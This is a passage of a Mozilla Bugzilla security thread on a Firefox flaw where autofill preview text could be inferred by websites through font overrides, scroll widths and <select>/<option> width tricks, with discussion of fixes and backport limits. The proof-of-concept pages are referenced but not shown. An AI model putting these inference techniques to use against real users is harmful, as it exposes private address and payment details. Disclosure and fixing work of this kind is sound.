* Chromium had the same issue and has pinned the font to `-webkit-small-control`, see [comment #0](/show_bug.cgi?id=1741888#c0 "VERIFIED FIXED - Autofill preview text can disclose sensitive information") 1-(4).
* Safari doesn't show a preview for autofill.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1741888#c9)• 3 years ago |
|  | |

Added the chromium bugs to the See Also field for convenience. Worth looking at their patches so we don't need to take 4 or 5 whacks at fixing it.

Keywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)See Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=916838>,
<https://bugs.chromium.org/p/chromium/issues/detail?id=951487>,
<https://bugs.chromium.org/p/chromium/issues/detail?id=1013882>,
<https://bugs.chromium.org/p/chromium/issues/detail?id=1035058>,
<https://bugs.chromium.org/p/chromium/issues/detail?id=1035063>

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a437141_666930)• 3 years ago |

Assignee: nobody → tgilesStatus: NEW → ASSIGNED

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1741888#c10)• 3 years ago |
|  | |

:emilio, :sgalich, does the following plan seem valid?

So synthesizing the information from the See Also chromium bugs, it looks like we need the following:

* [Pin the preview font so that websites can't override it](https://chromium.googlesource.com/chromium/src.git/%2B/036c081fe7cec07b3e04ffb16d869103e381b445%5E%21/#F0)
  + It looks like we can use `revert` according to :emilio's suggestion in [Comment #7](/show_bug.cgi?id=1741888#c7 "VERIFIED FIXED - Autofill preview text can disclose sensitive information")
* [Hide any overflow in the preview so that scroll width/height can't be used to determine content](https://chromium.googlesource.com/chromium/src.git/%2B/7a9e7a968aa77eae1410b40dbddd8b0dab44406a%5E%21/#F0)
  + Testing this out by modifying the `input:-moz-autofill-preview` and it looks like hiding the overflow here (without returning a fake height and width from the input/select element) will make the preview text not visible to the user, not sure what to do about that.
  + I guess returning the fake scroll width and height mentioned later will fix this issue? Not sure.
* [Return a fake scroll width and height from the input (and I guess select?) element if it is in a preview state](https://chromium.googlesource.com/chromium/src.git/%2B/7a9e7a968aa77eae1410b40dbddd8b0dab44406a%5E%21/#F0)
  + :emilio, I guess this is something that needs to be changed in [Element.cpp](https://searchfox.org/mozilla-central/source/dom/base/Element.cpp)?
* [Ensure generic font family names don't match web fonts unless they are quoted](https://chromium.googlesource.com/chromium/src.git/%2B/cc17930b5e93864e7f56a9d5dbfd3a1d3bee62c7%5E%21/#F0)
  + I don't know if we do this already or not, just to be clear
  + :emilio, are you aware if we ensure generic font family names don't match web fonts unless they are quoted?

Outside of the chromium bugs, it looks like we need to do the following:

* Ensure there is a limit on the number of <option>s that an autofill entry matches, from [Comment #6](/show_bug.cgi?id=1741888#c6 "VERIFIED FIXED - Autofill preview text can disclose sensitive information")
  + :serg, :emilio: should we follow [chromium's example here and put a hard limit of 512 options?](https://source.chromium.org/chromium/chromium/src/%2B/main%3Acomponents/autofill/core/common/autofill_data_validation.cc;l=17-19;drc=d805a11b69ccfc6376a1a5e05bfe603a4481c3a5)
* Add preview styling for select elements, then [pin the preview font so that websites can't override it](https://chromium.googlesource.com/chromium/src.git/%2B/0bd10e13a008389ec14bbe7cc95f17d82ea151c1%5E%21/#F1)
  + This seems to be as straightforward as adding a `select:-moz-autofill-preview` selector to [the current autofill rule in forms.css](https://searchfox.org/mozilla-central/rev/9a5f36b0ddb9cb8ae556fc5b45f8ccea0f0da6f8/layout/style/res/forms.css#991-993)
Flags: needinfo?(sgalich)Flags: needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1741888#c11)• 3 years ago |
|  | |

(In reply to Tim Giles [:tgiles] | back on Nov 29 from [comment #10](/show_bug.cgi?id=1741888#c10 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> * [Hide any overflow in the preview so that scroll width/height can't be used to determine content](https://chromium.googlesource.com/chromium/src.git/%2B/7a9e7a968aa77eae1410b40dbddd8b0dab44406a%5E%21/#F0)
>   + Testing this out by modifying the `input:-moz-autofill-preview` and it looks like hiding the overflow here (without returning a fake height and width from the input/select element) will make the preview text not visible to the user, not sure what to do about that.
>   + I guess returning the fake scroll width and height mentioned later will fix this issue? Not sure.
> * [Return a fake scroll width and height from the input (and I guess select?) element if it is in a preview state](https://chromium.googlesource.com/chromium/src.git/%2B/7a9e7a968aa77eae1410b40dbddd8b0dab44406a%5E%21/#F0)
>   + :emilio, I guess this is something that needs to be changed in [Element.cpp](https://searchfox.org/mozilla-central/source/dom/base/Element.cpp)?

That doesn't look right. Instead we should make sure that the preview text doesn't affect overflow. Does it affect overflow right now? I'd be a bit surprised but maybe we need to override [this](https://searchfox.org/mozilla-central/rev/aa8c75b83f636948f708986173965c84cae8c25f/layout/style/res/forms.css#148).

> * [Ensure generic font family names don't match web fonts unless they are quoted](https://chromium.googlesource.com/chromium/src.git/%2B/cc17930b5e93864e7f56a9d5dbfd3a1d3bee62c7%5E%21/#F0)
>   + I don't know if we do this already or not, just to be clear
>   + :emilio, are you aware if we ensure generic font family names don't match web fonts unless they are quoted?

Pretty sure this is a non-issue.

> Outside of the chromium bugs, it looks like we need to do the following:
>
> * Ensure there is a limit on the number of <option>s that an autofill entry matches, from [Comment #6](/show_bug.cgi?id=1741888#c6 "VERIFIED FIXED - Autofill preview text can disclose sensitive information")
>   + :serg, :emilio: should we follow [chromium's example here and put a hard limit of 512 options?](https://source.chromium.org/chromium/chromium/src/%2B/main%3Acomponents/autofill/core/common/autofill_data_validation.cc;l=17-19;drc=d805a11b69ccfc6376a1a5e05bfe603a4481c3a5)
> * Add preview styling for select elements, then [pin the preview font so that websites can't override it](https://chromium.googlesource.com/chromium/src.git/%2B/0bd10e13a008389ec14bbe7cc95f17d82ea151c1%5E%21/#F1)
>   + This seems to be as straightforward as adding a `select:-moz-autofill-preview` selector to [the current autofill rule in forms.css](https://searchfox.org/mozilla-central/rev/9a5f36b0ddb9cb8ae556fc5b45f8ccea0f0da6f8/layout/style/res/forms.css#991-993)

Yeah, though do we want to change backgrounds as well like for `<input>`?

Flags: needinfo?(emilio)

|  | [Sergey Galich [:serg]](/user_profile?user_id=691597) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1741888#c12)• 3 years ago |
|  | |

(In reply to Tim Giles [:tgiles] from [comment #10](/show_bug.cgi?id=1741888#c10 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> * Ensure there is a limit on the number of <option>s that an autofill entry matches, from [Comment #6](/show_bug.cgi?id=1741888#c6 "VERIFIED FIXED - Autofill preview text can disclose sensitive information")
>   + :serg, :emilio: should we follow [chromium's example here and put a hard limit of 512 options?](https://source.chromium.org/chromium/chromium/src/%2B/main%3Acomponents/autofill/core/common/autofill_data_validation.cc;l=17-19;drc=d805a11b69ccfc6376a1a5e05bfe603a4481c3a5)

Yes, limiting to 512 is reasonable and looks like a simple change.

Flags: needinfo?(sgalich)

|  | [Sergey Galich [:serg]](/user_profile?user_id=691597) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1741888#c13)• 3 years ago |
|  | |

Dropping it here for the record.

[html2canvas](https://html2canvas.hertzen.com/) can not capture preview when screenshotting element.

[getDisplayMedia()](https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getDisplayMedia) can be used to capture preview values, but it requires user's permission to capture.

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1741888#c14)• 3 years ago |
|  | |

More information on 1-(4); the initial fix implemented by Chromium could be bypassed with the `::first-line` pseudo-element on <input> (<https://crbug.com/1227170>, <https://crbug.com/1253101>, [CVE-2021-38004](https://www.cve.org/CVERecord?id=CVE-2021-38004), not public yet) and was patched in <https://crrev.com/932921>.

The font of <select> was not pinned at that time, thus vulnerable (<https://crbug.com/1253103>, not public yet), and a patch is WIP in <https://crrev.com/c/3231296>.

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1741888#c15)• 3 years ago |
|  | |

Attached file
[poc-width.html](attachment.cgi?id=9252525) (obsolete)
— [Details](attachment.cgi?id=9252525&action=edit)

(From [comment #10](/show_bug.cgi?id=1741888#c10 "VERIFIED FIXED - Autofill preview text can disclose sensitive information") by Tim Giles [:tgiles])

> * [Hide any overflow in the preview so that scroll width/height can't be used to determine content](https://chromium.googlesource.com/chromium/src.git/%2B/7a9e7a968aa77eae1410b40dbddd8b0dab44406a%5E%21/#F0)
>   + Testing this out by modifying the `input:-moz-autofill-preview` and it looks like hiding the overflow here (without returning a fake height and width from the input/select element) will make the preview text not visible to the user, not sure what to do about that.
>   + I guess returning the fake scroll width and height mentioned later will fix this issue? Not sure.
> * [Return a fake scroll width and height from the input (and I guess select?) element if it is in a preview state](https://chromium.googlesource.com/chromium/src.git/%2B/7a9e7a968aa77eae1410b40dbddd8b0dab44406a%5E%21/#F0)

For <select>, it seems it's possible to directly infer which option has been selected from the width, as the layout is changed during the preview if the <option> was not visible. Chromium is not vulnerable, as it calculates the width of <select> even from the hidden <option>s.

Please find attached the PoC, and the reproductions steps are identical to [comment #2](/show_bug.cgi?id=1741888#c2 "VERIFIED FIXED - Autofill preview text can disclose sensitive information").

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1741888#c16)• 3 years ago |
|  | |

(In reply to Emilio Cobos Álvarez (:emilio) from [comment #11](/show_bug.cgi?id=1741888#c11 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> That doesn't look right. Instead we should make sure that the preview text doesn't affect overflow. Does it affect overflow right now? I'd be a bit surprised but maybe we need to override [this](https://searchfox.org/mozilla-central/rev/aa8c75b83f636948f708986173965c84cae8c25f/layout/style/res/forms.css#148).

Forcing the overflow to be hidden in [here](https://searchfox.org/mozilla-central/rev/aa8c75b83f636948f708986173965c84cae8c25f/layout/style/res/forms.css#148) seems to help prevent the attack (in addition to the other steps required). No idea what the downstream impact would be from forcing this overflow to be hidden though. Does this approach seem reasonable?

> Yeah, though do we want to change backgrounds as well like for `<input>`?

If you're talking about [this rule](https://searchfox.org/mozilla-central/rev/70b32246fce5ca1f53af573a21c1939df58cb969/layout/style/res/forms.css#1003-1007), I've got no strong opinion adding a `select:autofill` selector to it. I can't think of any cases where select elements would have images in them (but I'm sure that's a case) so I'm not sure what benefit we would get from adding this `select:autofill` selector (as long as we're thinking of the same thing re: changing backgrounds like `<input>`). Any opinions :emilio?

Flags: needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1741888#c17)• 3 years ago |
|  | |

(In reply to Tim Giles [:tgiles] from [comment #16](/show_bug.cgi?id=1741888#c16 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Forcing the overflow to be hidden in [here](https://searchfox.org/mozilla-central/rev/aa8c75b83f636948f708986173965c84cae8c25f/layout/style/res/forms.css#148) seems to help prevent the attack (in addition to the other steps required). No idea what the downstream impact would be from forcing this overflow to be hidden though. Does this approach seem reasonable?

Sorta. You need to split it so it only applies to `::-moz-text-control-preview`. So just adding a:

```
::-moz-text-control-preview { overflow: hidden }

```

Rule right after should do, I think.

> If you're talking about [this rule](https://searchfox.org/mozilla-central/rev/70b32246fce5ca1f53af573a21c1939df58cb969/layout/style/res/forms.css#1003-1007), I've got no strong opinion adding a `select:autofill` selector to it. I can't think of any cases where select elements would have images in them (but I'm sure that's a case) so I'm not sure what benefit we would get from adding this `select:autofill` selector (as long as we're thinking of the same thing re: changing backgrounds like `<input>`). Any opinions :emilio?

Well, right now an autofilled select is not distinguishable from a regular select, but an autofilled input is. But perhaps we don't need to add a background, that's probably tangential to this bug anyways.

Flags: needinfo?(emilio)

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1741888#c18)• 3 years ago |
|  | |

(In reply to Emilio Cobos Álvarez (:emilio) from [comment #17](/show_bug.cgi?id=1741888#c17 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Sorta. You need to split it so it only applies to `::-moz-text-control-preview`. So just adding a:
>
> ```
> ::-moz-text-control-preview { overflow: hidden }
>
> ```
>
> Rule right after should do, I think.

Got it, thanks for that.

> Well, right now an autofilled select is not distinguishable from a regular select, but an autofilled input is. But perhaps we don't need to add a background, that's probably tangential to this bug anyways.

Yeah, we have [Bug 1740070](/show_bug.cgi?id=1740070 "VERIFIED FIXED - <select> elements aren't highlighted when previewing/autofilling credit card information") to fix <select>s from not being highlighted/reset accordingly.

With my current changes, the PoC attack site in [Comment #2](/show_bug.cgi?id=1741888#c2 "VERIFIED FIXED - Autofill preview text can disclose sensitive information") is no longer able to infer address or credit card expiry information from preview. Now on to the new PoC width attack in [Comment #15](/show_bug.cgi?id=1741888#c15 "VERIFIED FIXED - Autofill preview text can disclose sensitive information")

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1741888#c19)• 3 years ago |
|  | |

Hmm, it seems as if my current changes also prevent the PoC width issue. I'm able to preview address information on the poc-width.html file in [Comment #15](/show_bug.cgi?id=1741888#c15 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"), and the site is unable to infer the data from the preview.

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1741888#c20)• 3 years ago |
|  | |

Attached file
[Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio!](attachment.cgi?id=9253073)
— [Details](attachment.cgi?id=9253073&action=edit)

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1741888#c21)• 3 years ago |
|  | |

Attached file
[poc-width.html](attachment.cgi?id=9253107) (obsolete)
— [Details](attachment.cgi?id=9253107&action=edit)

(In reply to Tim Giles [:tgiles] from [comment #16](/show_bug.cgi?id=1741888#c16 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Forcing the overflow to be hidden in [here](https://searchfox.org/mozilla-central/rev/aa8c75b83f636948f708986173965c84cae8c25f/layout/style/res/forms.css#148) seems to help prevent the attack (in addition to the other steps required). No idea what the downstream impact would be from forcing this overflow to be hidden though. Does this approach seem reasonable?

This doesn't seem to prevent <select> from changing its width if the <option> was initially hidden.

(In reply to Tim Giles [:tgiles] from [comment #19](/show_bug.cgi?id=1741888#c19 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Hmm, it seems as if my current changes also prevent the PoC width issue. I'm able to preview address information on the poc-width.html file in [Comment #15](/show_bug.cgi?id=1741888#c15 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"), and the site is unable to infer the data from the preview.

This is because the PoC uses exact width matching, and widths change when the font is changed. Please find attached the updated PoC, which uses the matching font.

[Attachment #9252525](/attachment.cgi?id=9252525&action=edit "poc-width.html") -
Attachment is obsolete: true

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1741888#c22)• 3 years ago |
|  | |

Thank you for the updated width PoC page, I'm able to reproduce the inferred state issue.

:emilio, what's your opinion on solving the following issue?

From [Comment #15](/show_bug.cgi?id=1741888#c15 "VERIFIED FIXED - Autofill preview text can disclose sensitive information")

> For <select>, it seems it's possible to directly infer which option has been selected from the width, as the layout is changed during the preview if the <option> was not visible. Chromium is not vulnerable, as it calculates the width of <select> even from the hidden <option>s.

Should we make <select>s elements a fixed width where that fixed width is equal to the largest option, even if the option is hidden? My immediate concern is that doing something like this will break the layout of many sites (but I could obviously be wrong in that concern). But I mean, looking at how Chromium handles this situation, I guess we would be okay following Chromium's lead here if we can't figure out another solution.

Flags: needinfo?(emilio)

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1741888#c23)• 3 years ago |
|  | |

Another solution would be to make `FormAutofillSection::previewFormFields` skip hidden options.

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a1062864_600971)• 3 years ago |

[Attachment #9253073](/attachment.cgi?id=9253073&action=edit "Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio!") -
Attachment description: Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio! → WIP: Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio!

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1741888#c24)• 3 years ago |
|  | |

Yeah, skipping hidden options would be preferable, as those can't be selected by the user anyways.

Flags: needinfo?(emilio)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a1137963_600971)• 3 years ago |

[Attachment #9253073](/attachment.cgi?id=9253073&action=edit "Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio!") -
Attachment description: WIP: Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio! → Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio!

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1741888#c25)• 3 years ago |
|  | |

Attached file
[poc-width.html](attachment.cgi?id=9253303)
— [Details](attachment.cgi?id=9253303&action=edit)

Sorry, it seems <option>s with a fixed width, e.g., `option { width: 1px; }`, can also fix the width of <select>. Please find attached the revised PoC. But I guess this is a layout issue, as widths of <option>s should have no meaning and not affect the <select>?

[Attachment #9253107](/attachment.cgi?id=9253107&action=edit "poc-width.html") -
Attachment is obsolete: true

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1741888#c26)• 3 years ago |
|  | |

Thanks for the updated PoC, I appreciate trying to get this fixed correctly all at once.

:emilio, does it make sense to ignore any `width` styles of <option> elements? Would we need to fix the width of <select>'s based on their largest <option> or something? I'm not sure what the best solution is in this case. (and thanks for your patience for dealing with all my needinfo's!)

Flags: needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1741888#c27)• 3 years ago |
|  | |

(In reply to Tim Giles [:tgiles] from [comment #26](/show_bug.cgi?id=1741888#c26 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Thanks for the updated PoC, I appreciate trying to get this fixed correctly all at once.
>
> :emilio, does it make sense to ignore any `width` styles of <option> elements? Would we need to fix the width of <select>'s based on their largest <option> or something? I'm not sure what the best solution is in this case. (and thanks for your patience for dealing with all my needinfo's!)

Hmm, not sure, I suspect not... It'd definitely be a behavior change. It seems chromium browsers ignore `<option>` layout in combobox select but not listbox `<select>`:

```
<!doctype html>
<style>
  option { width: 500px }
  option:first-child { width: 1px }
</style>
<select>
  <option>ABC</option>
  <option>DEF</option>
  <option>GHI</option>
</select>
<br>
<select multiple>
  <option>ABC</option>
  <option>DEF</option>
  <option>GHI</option>
</select>

```

I see how that can make certain amount of sense, though it's not as simple as restricting `width`. For example, we'd need to also restrict all font-related properties, and it's easy to miss others:

```
<!doctype html>
<select>
  <option>ABC</option>
  <option style="font-size: 1px">DEFGHIJK</option>
  <option>GHI</option>
</select>

```

So if we're going for that then we need quite a rework of the menulist layout. Just took a look at Chromium fwiw, and here's what they do: [https://source.chromium.org/chromium/chromium/src/+/main:third\_party/blink/renderer/core/layout/layout\_box.cc;l=307;drc=32f574f6df1d37b0d9ed765fe138270414d79e49](https://source.chromium.org/chromium/chromium/src/%2B/main%3Athird_party/blink/renderer/core/layout/layout_box.cc;l=307;drc=32f574f6df1d37b0d9ed765fe138270414d79e49)

(Note that they use the `<option>` style for text-transform, which I think is a bug and can be used for the same purposes as [comment 25](/show_bug.cgi?id=1741888#c25 "VERIFIED FIXED - Autofill preview text can disclose sensitive information")'s width)...

Anyways, not really opposed to doing something like that I guess, but that's a rather big layout change (specially because we still have the non-e10s dropdown code around for the parent process... but we can look into removing it).

In any case given that, I doubt that should block fixing this bug.

Flags: needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a1196990_546716)• 3 years ago |

Depends on: [1744009](/show_bug.cgi?id=1744009 "RESOLVED FIXED - Try to improve / simplify combobox layout.")

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1741888#c28)• 3 years ago |
|  | |

Let me give a shot at fixing the above and clean up <select> layout a bit in [bug 1744009](/show_bug.cgi?id=1744009 "RESOLVED FIXED - Try to improve / simplify combobox layout.").

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1741888#c29)• 3 years ago |
|  | |

(ni? to remember filing the chromium bug about the select vs. option style)

Flags: needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1741888#c30)• 3 years ago |
|  | |

<https://bugs.chromium.org/p/chromium/issues/detail?id=1283930> (I don't believe it's security-sensitive because the intrinsic size doesn't actually change).

Flags: needinfo?(emilio)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a4809188_1689)• 3 years ago |

See Also: → [1745121](/show_bug.cgi?id=1745121 "NEW - Malicious third-party CSS can allow text content to be exfiltrated (with e.g. custom web-fonts)")

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1741888#c31)• 3 years ago |
|  | |

Landed: <https://hg.mozilla.org/integration/autoland/rev/b56be60b0629483583a69968e90066920ac1a5f4>

Backed out for reftest failures on autofill:

<https://hg.mozilla.org/integration/autoland/rev/054040c0628c6d5cee049a6f5080cd5949bcacc5>

Push with failure: <https://treeherder.mozilla.org/jobs?repo=autoland&group_state=expanded&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel&revision=b56be60b0629483583a69968e90066920ac1a5f4&selectedTaskRun=d5zQcCrUQFq3ahY2cAHl5A.0>

Failure log: <https://treeherder.mozilla.org/logviewer?job_id=365937779&repo=autoland&lineNumber=28979>

> REFTEST TEST-UNEXPECTED-FAIL | layout/reftests/forms/input/text/autofill-blank.html == layout/reftests/forms/input/text/autofill-preview-blank.html | image comparison, max difference: 112, number of differing pixels: 371

Flags: needinfo?(tgiles)

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1741888#c32)• 3 years ago |
|  | |

:emilio, do you have any resources on how to debug reftests or what I should be trying to do to fix this particular test? I haven't worked with reftests before so I have no idea what I should be doing in order to fix this issue. I really have no idea why making the text overflow hidden or setting the font to be system-ui would cause such a drastic change in number of differing pixels and cause the reftest to fail.

Flags: needinfo?(tgiles) → needinfo?(emilio)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1741888#c33)• 3 years ago |
|  | |

The reftest analyzer link from the failure log suggests that something changed with the size of the field.

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1741888#c34)• 3 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1741888&comment_id=15753051 "1 revision") |
|  | |

Did not know there was a reftest analyzer link, thanks for that information Ryan!

:emilio, so it appears that having the `system-ui !important` part for the `input:-moz-autofill-preview` selector is causing the reftest to fail. I'm not sure it makes sense to make the regular autofill input also be forced to use `system-ui`, but maybe that's what we do here? Maybe the reftest itself (== autofill-blank.html autofill-preview-blank.html) is no longer valid because of this `system-ui` change? Let me know what you think is an acceptable path forward here and appreciate the help as always

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1741888#c35)• 3 years ago |
|  | |

autofill arguably shouldn't change the size of the input (neither `:autofill` nor just the preview)... Does it do that on other browsers? Same for `<select>`.

For text inputs we can probably get away with setting the font-family only on the `::-moz-text-control-preview` pseudo-element. For `<select>`, probably after [bug 1744009](/show_bug.cgi?id=1744009 "RESOLVED FIXED - Try to improve / simplify combobox layout.") we don't need to do much? I would've expected the intrinsic sizing would request all the characters of all options regardless of whether they're displayed (though as I say it I think there are some escape hatches we should fix).

Flags: needinfo?(emilio)

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1741888#c36)• 3 years ago |
|  | |

(In reply to Emilio Cobos Álvarez (:emilio) from [comment #35](/show_bug.cgi?id=1741888#c35 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> autofill arguably shouldn't change the size of the input (neither `:autofill` nor just the preview)... Does it do that on other browsers? Same for `<select>`.

It doesn't appear to change on Chrome, but that's with me checking with my eyes and the inspector after autofilling. I'm not sure how to force elements in Chrome to be in an autofilled/preview autofill state using the console. Same thing for Safari, doesn't seem to change but that's checking with my eyes and the inspector after autofilling. The issue is the previewed blank state, so I haven't figured out a perfect way to emulate that on the other browsers.

> For text inputs we can probably get away with setting the font-family only on the `::-moz-text-control-preview` pseudo-element. For `<select>`, probably after [bug 1744009](/show_bug.cgi?id=1744009 "RESOLVED FIXED - Try to improve / simplify combobox layout.") we don't need to do much? I would've expected the intrinsic sizing would request all the characters of all options regardless of whether they're displayed (though as I say it I think there are some escape hatches we should fix).

I'll try it and see if that prevents the potential leak given the previous test cases

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1741888#c37)• 3 years ago |
|  | |

Fix autofill preview text not behaving as expected. r=sgalich,emilio

<https://hg.mozilla.org/integration/autoland/rev/7fd4ba5a4857677d0fa38c617a85edda489778d6>

<https://hg.mozilla.org/mozilla-central/rev/7fd4ba5a4857>

Status: ASSIGNED → RESOLVEDClosed: 3 years ago
[status-firefox98](/buglist.cgi?f1=cf_status_firefox98&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox98&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 98 Branch

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1741888#c38)• 3 years ago |
|  | |

What the status of this feature on ESR91?

Group: firefox-core-security → core-security-release
[status-firefox96](/buglist.cgi?f1=cf_status_firefox96&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox96&o1=equals&v1=wontfix)
[status-firefox97](/buglist.cgi?f1=cf_status_firefox97&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox97&o1=equals&v1=wontfix)
[status-firefox-esr91](/buglist.cgi?f1=cf_status_firefox_esr91&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=%3F)Flags: needinfo?(tgiles)

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a6483019_666930)• 3 years ago |

Flags: needinfo?(tgiles)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1741888#c39)• 3 years ago |
|  | |

(In reply to Ryan VanderMeulen [:RyanVM] from [comment #38](/show_bug.cgi?id=1741888#c38 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> What the status of this feature on ESR91?

The changes in the dependency chain are too big and risky to back-port, unfortunately. I don't really see any safe "wallpaper" fix we could take back (disable downloadable fonts? probably wouldn't go over well).

[status-firefox-esr91](/buglist.cgi?f1=cf_status_firefox_esr91&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=wontfix)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1741888#c40)• 3 years ago |
|  | |

Matthew: Heads up that we don't think we can safely back-port this fix to ESR. If you don't already, one fix Tor Browser could apply would be to disable downloaded fonts (doesn't fully fix the issue, but makes it harder)

Flags: needinfo?(sysrqb)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a6496356_1689)• 3 years ago |

